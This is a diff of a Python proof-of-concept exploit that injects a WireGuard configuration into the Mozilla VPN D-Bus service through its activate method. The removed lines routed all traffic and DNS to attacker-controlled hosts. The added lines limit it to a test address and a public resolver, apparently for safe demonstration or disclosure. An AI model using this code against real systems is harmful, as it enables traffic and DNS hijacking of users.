@@ -5,14 +5,14 @@ import pydbus
 def exploit():
     try:
         bus = pydbus.SystemBus()
-        vpn = bus.get("org.mozilla.vpn.dbus", "/org/mozilla/vpn/dbus")
+        vpn = bus.get("org.mozilla.vpn.dbus", "/")
     except Exception as e:
         print(f"[-] Failed to connect to DBus: {e}")
         return
 
-    # Malicious configuration
-    # Routes all traffic (0.0.0.0/0) to the attacker's gateway (10.66.66.1)
-    # Sets DNS to attacker's DNS (1.2.3.4)
+    # Safe configuration for PoC
+    # Routes only a specific test IP (192.0.2.1/32) to the tunnel.
+    # Sets DNS to a safe public resolver (8.8.8.8) to demonstrate injection without breaking resolution.
     malicious_config = {
         "hopType": "SingleHop",
         "privateKey": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", # Valid base64 key format
@@ -20,14 +20,13 @@ def exploit():
         "deviceIpv6Address": "fc00:bbbb:bbbb:bb01::2/128",
         "serverIpv4Gateway": "10.66.66.1",
         "serverIpv6Gateway": "fc00:bbbb:bbbb:bb01::1",
-        "serverIpv4AddrIn": "192.168.1.100", # Attacker's public IP
+        "serverIpv4AddrIn": "192.168.1.100", # Attacker's public IP (dummy)
         "serverIpv6AddrIn": "::1",
         "serverPublicKey": "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=",
         "serverPort": 51820,
-        "dnsServer": "1.2.3.4", # Attacker's DNS server
+        "dnsServer": "8.8.8.8", # Google DNS (Safe to inject)
         "allowedIPAddressRanges": [
-            {"address": "0.0.0.0", "range": 0, "isIpv6": False},
-            {"address": "::", "range": 0, "isIpv6": True}
+            {"address": "192.0.2.1", "range": 32, "isIpv6": False} # TEST-NET-1, safe to route
         ]
     }
 
@@ -36,7 +35,7 @@ def exploit():
         # The activate method takes a JSON string
         vpn.activate(json.dumps(malicious_config))
         print("[+] Exploit sent successfully!")
-        print("[+] Check 'ip route' and '/etc/resolv.conf' (or resolvectl status) to verify hijacking.")
+        print("[+] Check 'ip route' for 192.0.2.1/32 and '/etc/resolv.conf' (or resolvectl status) for 8.8.8.8 to verify hijacking.")
     except Exception as e:
         print(f"[-] Exploit failed: {e}")
 
